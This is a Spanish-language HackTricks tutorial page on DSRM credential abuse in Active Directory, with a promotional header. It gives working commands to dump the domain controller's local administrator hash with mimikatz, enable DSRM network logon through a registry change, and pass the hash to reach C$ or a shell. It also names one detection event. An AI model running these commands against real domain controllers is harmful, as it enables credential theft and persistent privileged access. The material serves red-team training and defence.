<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


# Credenciales de DSRM

Existe una cuenta de **administrador local** dentro de cada **DC**. Teniendo privilegios de administrador en esta máquina, puedes usar mimikatz para **volcar el hash del Administrador local**. Luego, modificando un registro para **activar esta contraseña** para que puedas acceder de forma remota a este usuario Administrador local.\
Primero necesitamos **volcar** el **hash** del usuario **Administrador local** dentro del DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Entonces necesitamos verificar si esa cuenta funcionará, y si la clave del registro tiene el valor "0" o no existe, debes **establecerla en "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Entonces, utilizando un PTH puedes **listar el contenido de C$ o incluso obtener una shell**. Ten en cuenta que para crear una nueva sesión de PowerShell con ese hash en memoria (para el PTH) **el "dominio" utilizado es solo el nombre de la máquina del DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
## Mitigación

* Evento ID 4657 - Auditoría de creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
